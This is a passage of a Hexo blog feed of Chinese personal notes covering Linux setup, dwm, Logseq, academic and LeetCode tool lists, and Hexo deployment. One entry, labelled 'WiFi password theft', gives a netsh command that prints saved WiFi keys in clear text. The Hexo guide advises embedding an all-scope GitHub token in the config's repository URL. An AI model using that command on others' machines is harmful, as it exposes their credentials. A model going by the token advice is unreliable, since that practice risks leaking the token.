        <content type="html"><![CDATA[<h1 id="自由"><a href="#自由" class="headerlink" title="自由"></a>自由</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;http://127.0.0.1:12333&quot;</span><br></pre></td></tr></table></figure><h1 id="指定显卡"><a href="#指定显卡" class="headerlink" title="指定显卡"></a>指定显卡</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="查看显示服务器"><a href="#查看显示服务器" class="headerlink" title="查看显示服务器"></a>查看显示服务器</h1><p>linux最常见的显示服务器是Xorg，但是这个协议虽然常见，但是它有历史包袱(就像Window一样，要兼容之前的版本，Win11还有拨号上网)。<br>Wayland，新的显示服务器</p><h2 id="查看当前的显示服务器"><a href="#查看当前的显示服务器" class="headerlink" title="查看当前的显示服务器"></a>查看当前的显示服务器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $XDG_SESSION_TYPE</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写作与学术</title>
      <link href="/2022/04/05/%E5%86%99%E4%BD%9C%E4%B8%8E%E5%AD%A6%E6%9C%AF/"/>
      <url>/2022/04/05/%E5%86%99%E4%BD%9C%E4%B8%8E%E5%AD%A6%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><h2 id="drawio"><a href="#drawio" class="headerlink" title="drawio"></a>drawio</h2><p>一款简洁强大的<a href="https://github.com/jgraph/drawio">绘图工具</a>。免费开源可以自行部署也可以在线使用，功能上直追 Microsoft Visio，还能<a href="https://app.diagrams.net/">在线使用</a></p><h1 id="文字"><a href="#文字" class="headerlink" title="文字"></a>文字</h1><h2 id="linggle"><a href="#linggle" class="headerlink" title="linggle"></a>linggle</h2><p><a href="https://linggle.com/">用词搭配</a>。用语言模型告诉你后面的搭配应该用什么<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649071758182_0.png" alt="image.png"></p><h2 id="Omit"><a href="#Omit" class="headerlink" title="Omit"></a>Omit</h2><p><a href="https://wikidiff.com/neglect/omit">近义词辨析</a><br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649071745555_0.png" alt="image.png"></p><h2 id="ESODA"><a href="#ESODA" class="headerlink" title="ESODA"></a>ESODA</h2><p>科研论文里常见哪些词组。有没有人这么用过，来目标的科研领域的论文里搜一下这个短语的出现次数和使用场景： <img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649071825378_0.png" alt="image.png"><br><a href="http://www.esoda.org/">地址</a></p><h2 id="Academic-Phrasebank"><a href="#Academic-Phrasebank" class="headerlink" title="Academic Phrasebank"></a>Academic Phrasebank</h2><p>学术用语检索。<a href="https://www.phrasebank.manchester.ac.uk/">地址</a></p><h1 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h1><h2 id="Mathpix-Snip"><a href="#Mathpix-Snip" class="headerlink" title="Mathpix Snip"></a>Mathpix Snip</h2><p>手写&#x2F;截图 转 LaTex公式，<a href="https://mathpix.com/">地址</a></p><h2 id="Mathcha"><a href="#Mathcha" class="headerlink" title="Mathcha"></a>Mathcha</h2><p>手写公式，直接转 latex 代码。<a href="https://www.mathcha.io/">地址</a></p><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><h2 id="TablesGenerator"><a href="#TablesGenerator" class="headerlink" title="TablesGenerator"></a>TablesGenerator</h2><p>latex 表格代码一键生成。<a href="https://www.tablesgenerator.com/">地址</a></p><h2 id="Ctan"><a href="#Ctan" class="headerlink" title="Ctan"></a>Ctan</h2><p>直接把excel转成latex代码。<a href="https://www.ctan.org/tex-archive/support/excel2latex">地址</a></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="ColorBrewer"><a href="#ColorBrewer" class="headerlink" title="ColorBrewer"></a>ColorBrewer</h2><p><a href="https://colorbrewer2.org/">颜色搭配</a>（色盲友好型）</p><h2 id="Acronymify"><a href="#Acronymify" class="headerlink" title="Acronymify"></a>Acronymify</h2><p>给自己的model起一个酷炫的缩写，<a href="http://acronymify.com/">地址</a></p><h2 id="Echarts"><a href="#Echarts" class="headerlink" title="Echarts"></a>Echarts</h2><p>论文图表太丑？快来这里找找模板。<a href="https://echarts.apache.org/examples/en/index.html">地址</a><br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649071557558_0.png" alt="image.png"><br>-</p><h1 id="期刊与会议工具"><a href="#期刊与会议工具" class="headerlink" title="期刊与会议工具"></a>期刊与会议工具</h1><h2 id="Text-to-Speech"><a href="#Text-to-Speech" class="headerlink" title="Text to Speech"></a>Text to Speech</h2><p>有的paper需要做一个video来介绍，对自己口语不是很有信心的话可以用G家的text2speech（这个领域Google应该是当之无愧的霸主），还能调节语速，非常贴心。<a href="https://cloud.google.com/text-to-speech">地址</a></p><h2 id="AI-Conference-Deadline"><a href="#AI-Conference-Deadline" class="headerlink" title="AI Conference Deadline"></a>AI Conference Deadline</h2><p>AI顶会的 deadline <a href="https://aideadlin.es/?sub=ML,CV,NLP">倒计时工具</a></p><h2 id="mmhmm"><a href="#mmhmm" class="headerlink" title="mmhmm"></a>mmhmm</h2><p>教学直播利器，能够实现李沐大神的那种讲解论文的形式，固定人的演讲区域，并显示背景的讲解。</p><h2 id="avatarify"><a href="#avatarify" class="headerlink" title="avatarify"></a>avatarify</h2><p><a href="https://github.com/alievk/avatarify-python">视频会议换脸</a></p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><h2 id="Engineering-Village"><a href="#Engineering-Village" class="headerlink" title="Engineering Village"></a>Engineering Village</h2><p>查找期刊的简写，IEEE经常出现。<a href="https://www.engineeringvillage.com/search/quick.url">地址</a></p><h2 id="Citationmachine"><a href="#Citationmachine" class="headerlink" title="Citationmachine"></a>Citationmachine</h2><p>调整各种来源的引用格式。<a href="https://www.citationmachine.net/">地址</a></p><h2 id="Rebiber"><a href="#Rebiber" class="headerlink" title="Rebiber"></a>Rebiber</h2><h2 id="修复错误引用版本。规范化顶会论文引用格式的工具，如果你错误的引用了论文的arxiv版本而非他在会议上的发表版本，Rebiber帮你修正。"><a href="#修复错误引用版本。规范化顶会论文引用格式的工具，如果你错误的引用了论文的arxiv版本而非他在会议上的发表版本，Rebiber帮你修正。" class="headerlink" title="修复错误引用版本。规范化顶会论文引用格式的工具，如果你错误的引用了论文的arxiv版本而非他在会议上的发表版本，Rebiber帮你修正。"></a>修复错误引用版本。规范化顶会论文引用格式的工具，如果你错误的引用了论文的arxiv版本而非他在会议上的发表版本，<a href="https://github.com/yuchenlin/rebiber">Rebiber</a>帮你修正。</h2>]]></content>
      
      
      <categories>
          
          <category> 学术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>精选</title>
      <link href="/2022/04/05/%E7%B2%BE%E9%80%89/"/>
      <url>/2022/04/05/%E7%B2%BE%E9%80%89/</url>
      
        <content type="html"><![CDATA[<p>#收集<br>appwrite : 开源的后端，包括用户权限，数据库的功能。提供来多语言的SDK<br>diagrams.net ： 绘图软件，代替visio，还有思维导图<br><a href="https://www.smort.io/">smort</a> : 阅读文章的工具，可以对其他网站的文本进行编辑，甚至可以作用与其他网站，只需要将其他网站加到这个网站后面<br>ProperTree（黑苹果的时候会用到）：编译配置文件的，用来改硬件信息<br>netsh : WiFI密码窃取<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示所有的可登入wifi</span></span><br><span class="line">netsh wlan show profiles</span><br><span class="line">netsh wlan show profiles key=clear name=<span class="string">&quot;CCF&quot;</span></span><br><span class="line"><span class="comment"># 关键内容就是密码</span></span><br></pre></td></tr></table></figure><br><a href="https://github.com/huiyadanli/RevokeMsgPatcher">https://github.com/huiyadanli/RevokeMsgPatcher</a> ：微信防撤回<br><a href="https://github.com/nektos/act">nektos&#x2F;act</a> ：Github Action调试<br><a href="https://github.com/5ime/video_spider">5ime&#x2F;video_spider</a> ：视频去水印<br><a href="https://github.com/ArchiveBox/ArchiveBox">ArchiveBox&#x2F;ArchiveBox</a> ：将网页保存成为资料库<br><a href="https://github.com/sickcodes/Docker-OSX">sickcodes&#x2F;Docker-OSX</a> ：在docker里跑macos<br><a href="https://github.com/googlevr/tilt-brush">googlevr&#x2F;tilt-brush</a> ：谷歌开源的VR绘图工具<br><a href="https://github.com/brunosimon/folio-2019">brunosimon&#x2F;folio-2019</a> ：极度装逼的博客搭建<br><a href="https://github.com/guofei9987/blind_watermark">guofei9987&#x2F;blind_watermark</a> ：给图片加盲水印<br>GIthub工作区：Github加速， 在项目地址 github 后面加上 1s<br><a href="https://github.com/ADD-SP/ngx_waf">ADD-SP&#x2F;ngx_waf</a> ：Nginx防火墙<br><a href="https://github.com/antvis/X6">antvis&#x2F;X6</a> ：AntV 旗下的图编辑引擎。提供了开箱即用的交互组件和简单易用的节点定制能力，从而能够快速完成流程图、DAG 图、ER 图等图应用。<br><a href="https://github.com/HaujetZhao/QuickCut">HaujetZhao&#x2F;QuickCut</a> ：QuickCut: 一款轻量、好用的开源视频处理工具。它是基于 PyQt5 开发的桌面工具，用于满足非专业用户的视频处理需求：压缩视频、转码视频、倒放视频、合并片段、根据字幕裁切片段、自动配字幕、自动剪辑等<br><a href="http://waifu2x.udp.jp/">waifu2x</a>：waifu2x: 基于机器学习把图片、照片变得高清。该项目使用卷积神经网络对图片进行 1-2 倍的无损放大操作，支持降噪保证图片质量。<a href="https://github.com/nagadomi/waifu2x">Github地址</a><br><a href="https://github.com/HelloZeroNet/ZeroNet">HelloZeroNet&#x2F;ZeroNet</a> ： 一个使用 Bitcoin 加密和 BitTorrent 网络的去中心化网络。将传统巨头垄断的互联网变得平民化，不需要租用服务器不需要公网 IP，每个人都可以轻松创建分布式博客、分布式论坛、分布式微博、分布式视频网站、分布式直播网站等等<br><a href="https://github.com/soimort/you-get">soimort&#x2F;you-get</a> ：一个 Python 写的视频下载工具，下载工具千万个但我仅仅推荐了这个工具<br><a href="https://unbug.github.io/codelf/">CODELF</a> ：变量命名工具。算机科学里两件最难的事：缓存失效和命名。该工具支持直接搜索中文，当你查中文的时候，Codelf 会直接查好单词和单词的近义词给你。然后再搜索 Github、Bitbucket、Google Code 等上的开源项目的源码匹配出与这些词汇相关的变量名和函数名。<a href="https://hellogithub.com/periodical/statistics/click/?target=https://github.com/unbug/codelf">Github地址</a><br><a href="https://github.com/Denon/syncPlaylist">Denon&#x2F;syncPlaylist</a> ：在网易云音乐与 QQ 音乐之间同步歌单<br><a href="https://github.com/hua1995116/react-resume-site">hua1995116&#x2F;react-resume-site</a> ：一款免费的简历在线制作工具。用写 Markdown 的方式制作出好看的简历。在线：<a href="https://resume.mdedit.online/editor/#/">木及简历</a><br>keyboard test utility ：键盘按键测试软件<br><a href="https://github.com/nativefier/nativefier">nativefier&#x2F;nativefier</a> ：能够把 Web 页面变成本地应用的命令行工具。通过 Electron+Chromium 把网站包装成本地 .app、.exe 等可执行文件，支持运行在 Windows、macOS 和 Linux 操作系统上<br><a href="https://github.com/myspaghetti/macos-virtualbox">macos-virtualbox</a>：帮你在 VirtualBox 上安装 macOS 操作系统的工具。这个工具是一个 Bash 脚本，运行后只需要按回车即可完成安装。目前已支持 Linux 、Windows、macOS 多个主流操作系统，可安装 Catalina (10.15)、Mojave (10.14) 和 High Sierra (10.13) 等多个不同版本的苹果系统<br><a href="https://github.com/nilaoda/BBDown">BBDown</a> ：命令行哔哩哔哩视频下载工具<br><a href="https://hellogithub.com/periodical/statistics/click/?target=https://github.com/xinntao/Real-ESRGAN">Real-ESRGAN</a>：修复老旧图像。图像超分辨率模型，修复漫画图像的效果惊艳。通过 AI 技术将低分辨率、模糊的图像修复成高清图像，可用于图像放大和提升质量。基于它实现的<a href="https://github.com/X-Lucifer/AI-Lossless-Zoomer">桌面工具</a>，还有可以直接使用的 Python 脚本，快去试试效果吧<br><a href="https://hellogithub.com/periodical/statistics/click/?target=https://github.com/iovisor/bpftrace">bpftrace</a>：Linux 高级追踪工具和语言。该工具基于 eBPF 和 BBC 实现了通过探针机制采集内核和程序运行的信息，然后用图表等方式将信息展示出来，帮助开发者找到隐藏较深的 Bug、安全问题和性能瓶颈<br><a href="https://hellogithub.com/periodical/statistics/click/?target=https://github.com/moshang-xc/lottery">lottery</a>：年会抽奖程序。基于 Express + Three.js 的 3D 球体抽奖项目，能够自定义文字、图片和抽奖规则，还支持一键导入抽奖人员和导出抽奖结果<br><a href="https://github.com/microsoft/playwright?utm_source=hackernewsletter&utm_medium=email&utm_term=code">Playwright</a> ：web自动化框架，类似于firefox的webkit</p>]]></content>
      
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DWM</title>
      <link href="/2022/04/05/DWM/"/>
      <url>/2022/04/05/DWM/</url>
      
        <content type="html"><![CDATA[<h1 id="窗口模式"><a href="#窗口模式" class="headerlink" title="窗口模式"></a>窗口模式</h1><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>MOD+XK_t</td><td>水平布局</td></tr><tr><td>MOD+XK_m</td><td>堆叠布局</td></tr><tr><td>MOD+XK_n</td><td>没有布局</td></tr><tr><td>MOD+r</td><td>像@一样排列的布局</td></tr><tr><td>MOD+ShiftMask+r</td><td>专注与中间的布局</td></tr></tbody></table><h1 id="窗口相关功能"><a href="#窗口相关功能" class="headerlink" title="窗口相关功能"></a>窗口相关功能</h1><table><thead><tr><th>按键</th><th>功能</th><th>原始按键</th></tr></thead><tbody><tr><td>MOD+o</td><td>切换到上一个屏幕</td><td>MOD + XK_comma(逗号)</td></tr><tr><td>MOD+p</td><td>切换下一个屏幕</td><td>MOD + XK_period(点号)</td></tr><tr><td>MOD + ShiftMask +o</td><td>将当前页面移动上一个屏幕</td><td></td></tr><tr><td>MOD + ShiftMask +p</td><td>将当前页面移动到下一个屏幕</td><td></td></tr><tr><td>MOD +e</td><td>顺时针切换到下一个窗口</td><td></td></tr><tr><td>MOD+b</td><td>逆时针切换到上一个窗口</td><td></td></tr><tr><td>super+鼠标左键</td><td>拖动窗口</td><td>在luke的配置里是shift+鼠标左键</td></tr><tr><td>super+鼠标右键</td><td>缩放窗口</td><td>在luke里是super+鼠标右键</td></tr><tr><td>super+shift+空格</td><td>将窗口还原回dwm布局</td><td></td></tr></tbody></table><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="picom"><a href="#picom" class="headerlink" title="picom"></a>picom</h2><p>可以替换成xrender，之前桌面无法透明就是这个picom命令导致的。还有就是compton（当前用的就是这个）。</p><blockquote><p>picom 和compton 是X11显示服务器下的窗口渲染器。</p></blockquote><h2 id="缺"><a href="#缺" class="headerlink" title="缺"></a>缺</h2><p>libx11-dev<br>libxkbcommon-x11-dev<br>libghc-x11-dev<br>libxft-dev</p><h2 id="需要配置字体"><a href="#需要配置字体" class="headerlink" title="需要配置字体"></a>需要配置字体</h2><p>同vim字体的配置。</p><h2 id="小键盘自启"><a href="#小键盘自启" class="headerlink" title="小键盘自启"></a>小键盘自启</h2><p>需要安装一个numlockx，来自动启动数字区域，老是点一下太麻烦了。apt安装。</p><h2 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h2><p>需要scripts文件夹配合，用户自定义功能都在这里。</p><blockquote><p>dwm.c -&gt; runAutostart -&gt;调用scripts中的autostart.sh，并在后台执行</p></blockquote><h2 id="创建桌面启动入口"><a href="#创建桌面启动入口" class="headerlink" title="创建桌面启动入口"></a>创建桌面启动入口</h2><p>ubuntu版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置启动项，在/usr/share/xsessions文件下</span></span><br><span class="line"><span class="comment"># dwm.desktop</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Encoding=UTF-<span class="number">8</span></span><br><span class="line">Name=Dwm</span><br><span class="line">Comment=Dynamic Window manager</span><br><span class="line">Exec=dwm</span><br><span class="line">Icon=dwm</span><br><span class="line"><span class="type">Type</span>=XSession</span><br></pre></td></tr></table></figure><h2 id="双屏"><a href="#双屏" class="headerlink" title="双屏"></a>双屏</h2><blockquote><p>设置屏幕的位置通过autostart里的位置来确定，通过xrandr来先确定显示器代号。</p></blockquote><h1 id="打补丁"><a href="#打补丁" class="headerlink" title="打补丁"></a>打补丁</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>wget下载指定的diff文件</li><li>patch &lt; *.diff  打补丁(打补丁的时候需要在文件的根目录下执行，补丁随意放哪里，为了管理放在patches里最好，但是反正打好了也不需要了，就是做个记号，知道打了啥)</li><li>这里可能会出现无法找到文件的问题，这是因为我们的补丁现在都是打在config.h文件中(不是默认的config.def.h，这个已经被删了不要了)，需要^^指定config.h^^。</li><li>如果没有错误，则使用sudo make clean install 进行安装。</li></ol><h2 id="Failed"><a href="#Failed" class="headerlink" title="Failed"></a>Failed</h2><p>当出现失败的时候就需要手动去错误的位置进行修改。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1645526418947_0.png" alt="image.png"><br>这里制定了2个错误位置，就需要去指定的文件进行查看，这里表示需要删除的，+ 表示需要添加的。</p><h3 id="config-h-rej"><a href="#config-h-rej" class="headerlink" title="config.h.rej"></a>config.h.rej</h3><p>只会制定当前需要添加但是未被修改的内容，需要对照的去修改config.h文件。</p><h3 id="dwm-c-rej"><a href="#dwm-c-rej" class="headerlink" title="dwm.c.rej"></a>dwm.c.rej</h3><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><h2 id="dwm插件推荐"><a href="#dwm插件推荐" class="headerlink" title="[[dwm插件推荐]]"></a>[[dwm插件推荐]]</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Logseq</title>
      <link href="/2022/04/04/Logseq/"/>
      <url>/2022/04/04/Logseq/</url>
      
        <content type="html"><![CDATA[<h1 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h1><p>todo可以配合data packer使用，在指定日期的时候会显示该任务<br>doing或者now ： 会显示在明天的note中，直到被完成</p><h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p>ABC三个优先级</p><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><p>shfit+左键 ： 侧栏打开</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>alias 取别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">collapsed:: true</span><br><span class="line">alias:: a, b</span><br></pre></td></tr></table></figure><p>双冒号打头，逗号分割</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">collapsed:: true</span><br><span class="line">#+TITLE: namea</span><br><span class="line">#+ALIAS: nameb</span><br></pre></td></tr></table></figure><p>logseq格式<br>加密，logseq在设置中增加了文件加密功能，使用<a href="https://github.com/FiloSottile/age">age</a>来进行加密（<a href="https://github.com/str4d/rage">rage</a>是其rust重构的版本），<br>模板<br>可以选中内容然后使用make template来构建，但是这样太分散</p><h1 id="幻灯片"><a href="#幻灯片" class="headerlink" title="幻灯片"></a>幻灯片</h1><p>缩进会让生成的幻灯片通过上下方向继续控制，而不缩进就是左右展示，这和几级标题没有关系。</p><h1 id="闪卡"><a href="#闪卡" class="headerlink" title="闪卡"></a>闪卡</h1><p>可以通过closed进行创建针对字的闪卡，也可以通过井号+card来标记需要制作的块，然后在使用井号+一个关键字来针对类别建立闪卡区域，缩进的内容就是对card内容的待回答。<br>之后通过命令cards+指定的关键字就能够开启闪卡功能</p><h1 id="PDF编辑"><a href="#PDF编辑" class="headerlink" title="PDF编辑"></a>PDF编辑</h1><p>想要引入logseq进行pdf阅读，需要使用感叹号引导的<a href="">   </a>形式进行，缺少感叹号会导致无法使用logseq内置的阅读器进行编辑。</p><blockquote><p>PDF最好不要有特殊符号，如点，反斜杠等，会导致后续连接出现丢失从而重新构建一个新的标注页面，很乱</p></blockquote><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>在logseq中，每个cell开头都是由 加空格引导的，这是与传统的markdown语法不兼容的地方，所以在使用无序列表的时候，最好使用 * 号或者 + 号来表示。以试区别。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>刷题教程</title>
      <link href="/2022/04/04/%E5%88%B7%E9%A2%98%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/04/%E5%88%B7%E9%A2%98%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>用动<a href="https://github.com/MisterBooo/LeetCodeAnimation">画的形式</a>呈现解 LeetCode 题目的思路</li><li><a href="https://github.com/apachecn/apachecn-algo-zh">Leetcode 题解</a>及经典算法实现，实现语言包含 Python、Java、C++、JS</li><li><a href="https://a.gin.sh/">Golang版</a>leetcode</li><li><a href="https://github.com/haoel/leetcode">C++和python</a></li><li>C++和python的<a href="https://github.com/azl397985856/leetcode">解法</a>+一些思路</li><li>python的<a href="https://github.com/RealHacker/leetcode-solutions">OJ</a></li><li><a href="https://github.com/greyireland/algorithm-pattern">Golang版本</a>， 项目从 Go 语言入门讲起，总结了一套刷题模板和解题套路，示例代码为 Go 语言</li><li>《<a href="https://github.com/halfrost/LeetCode-Go">LeetCode Cookbook</a>》，<a href="https://books.halfrost.com/leetcode/">在线阅读</a><br>   帮助开发者在 LeetCode 上做题，提供解题思路和代码的项目。目前已经收录了 500+ 道题的题解和代码，代码都是 runtime beats 100%，代码全部都是用 Go 语言实现。</li><li><a href="https://github.com/begeekmyfriend/leetcode">C语言版本</a></li><li><a href="https://github.com/haoel/leetcode">C++版本</a></li><li><a href="https://github.com/qiyuangong/leetcode">python与java版本</a></li><li><a href="https://github.com/soapyigu/LeetCode-Swift">Swift</a>版本</li><li><a href="https://github.com/aQuaYi/LeetCode-in-Go">Golang</a></li><li><a href="https://github.com/everthis/leetcode-js">JavaScript</a><br>   LeetCode上面主要收集了各大 IT 公司的<a href="https://github.com/Blankj/awesome-java-leetcode">笔试面试题(Java)</a><br>   更加贴近前端的数据结构与算法的库(<a href="https://github.com/azl397985856/leetcode">JavaScript </a>)<br>   以 leetcode 作为切入点，详细讲解关于数据结构的方方面面， 并以JavaScript 语言作为解题语言。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bash教程</title>
      <link href="/2022/04/04/Bash%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/04/Bash%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ziishaned/learn-regex">易学的正则表达式教程</a><br>SQL 速查表：<a href="https://github.com/enochtangg/quick-SQL-cheatsheet/blob/master/README_zh-hans.md">中文</a>，<a href="https://github.com/enochtangg/quick-SQL-cheatsheet">英文</a><br><a href="https://github.com/dylanaraps/pure-bash-bible">奇技淫巧</a><br><a href="https://github.com/wangdoc/bash-tutorial">Bash 教程</a> ， <a href="https://wangdoc.com/bash/">在线阅读</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo配置</title>
      <link href="/2022/04/04/hexo%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/04/04/hexo%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>快速构建博客，依托github实现免费的博客</p></blockquote><p>Hexo是一个基于Nodejs的静态博客框架。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>hexo s</td><td>生成预览界面</td></tr><tr><td>hexo clean</td><td>清理之前的构建信息，在发布新内容的时候重新连接使用</td></tr><tr><td>hexo g</td><td>生成静态页面</td></tr><tr><td>hexo d</td><td>上传到github</td></tr><tr><td>hexo n [post] name</td><td>默认构建post, 可以选择post<code>、</code>page<code>和</code>draft。分别存储在source对应的文件夹下</td></tr></tbody></table><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>hexo创建文件依据Scaffold文件夹中定义的模板进行。默认就只有可选的三个模板：post，page，draft。也可以自己构建新的模板。</p><p>draft: 草稿，并不发布到博客中。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol><li>需要保证系统中安装了nodejs 和 git</li><li>使用node安装hexo<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-g表示全局安装</span></span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1>创建博客目录，并在该目录下进行hexo的初始化<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在博客初始化的时候才会只用，拉取官方的hexo配置到指定文件夹</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后就可以通过 s 参数进行本地的预览, 通过指定的端口就可以访问本地博客内容，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里主要用来看看是否能够成功</span></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><h1 id="通过github托管博客"><a href="#通过github托管博客" class="headerlink" title="通过github托管博客"></a>通过github托管博客</h1><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2>仓库的名字一定要与用户名一致，并添加 .github.io 方便访问。如我的github名称为ZCDu，那么仓库的名字就为<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZCDu.github.io</span><br></pre></td></tr></table></figure><h2 id="发布博客到github"><a href="#发布博客到github" class="headerlink" title="发布博客到github"></a>发布博客到github</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改_config.yaml文件指定的内容，对应deploy部署部分</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Deployment</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意，冒号之后需要一个空格，隔离参数</span></span><br><span class="line">deploy:</span><br><span class="line">type: &#x27;git&#x27;</span><br><span class="line">repository: https://[GithubToken]@github.com/[GithubUsername]/[GithubBlogRepo].git # 虽然可以使用ssh密钥的形式，但是这里推荐使用Token，具体看自动部署。</span><br><span class="line">branch: main # 与github主分支名相同即可</span><br></pre></td></tr></table></figure>通过以上步骤，就制定了部署的位置。之后需要hexo插件将markdown编译为HTML页面，类似于mkdocs：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实现md编译为HTML页面的hexo库, 并部署到github上</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成静态网页，生成的网页存放在public目录下，这里也可以通过将public中的文件全部拷贝到网站的根目录下，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后启动nginx或者apache服务进行访问</span></span><br><span class="line">hexo g </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对应hexo-deployer-git, 上传页面所需要的内容到github，并不会将整个文件上传</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><blockquote><p>使用令牌代替密码，由于github安全。也是可以通过ssh来进行只是对应需要修改deploy repository参数，这里推荐使用令牌。</p></blockquote></li></ol><p>在输入github密码的时候进行。在github setting 最下面 Developer settings的Personal access tokens，创建的令牌最好所有都选上，然后将这个令牌输入密码的部分,<strong>之后就可以头通过仓库名来访问博客的为网站</strong>，如本博客就是 ZCDu.github.io 进行访问。</p><h2 id="发布到gitee"><a href="#发布到gitee" class="headerlink" title="发布到gitee"></a>发布到gitee</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 